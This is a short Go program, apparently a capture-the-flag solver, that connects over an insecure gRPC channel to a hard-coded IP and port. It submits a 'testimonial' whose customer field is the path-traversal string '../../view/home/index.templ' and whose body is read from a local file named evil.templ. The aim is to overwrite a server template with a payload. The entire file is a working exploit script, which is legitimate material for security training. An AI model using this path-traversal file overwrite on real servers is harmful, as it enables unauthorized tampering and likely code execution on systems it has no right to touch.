package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"solver/pb"
	"sync"
	"google.golang.org/grpc"
)

var (
	grpcClient *Client
	mutex      *sync.Mutex
)

func init() {
	grpcClient = nil
	mutex = &sync.Mutex{}
}

type Client struct {
	pb.RickyServiceClient
}

func GetClient() (*Client, error) {
	mutex.Lock()
	defer mutex.Unlock()

	if grpcClient == nil {
		conn, err := grpc.Dial("94.237.53.82:36889", grpc.WithInsecure())
		if err != nil {
			return nil, err
		}

		grpcClient = &Client{pb.NewRickyServiceClient(conn)}
	}

	return grpcClient, nil
}

func (c *Client) SendTestimonial(customer, testimonial string) error {
	ctx := context.Background()

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}

func main(){
  body, err := os.ReadFile("./evil.templ")
  if err != nil {
    log.Fatal("Error ", err)
  }

  c, err := GetClient()
  if err != nil {
    log.Fatal("Error ", err)
  }

  err = c.SendTestimonial("../../view/home/index.templ", string(body))
  if err != nil {
    log.Fatal("Error Occured: ", err)
  }

  fmt.Println("Payload sent")
}
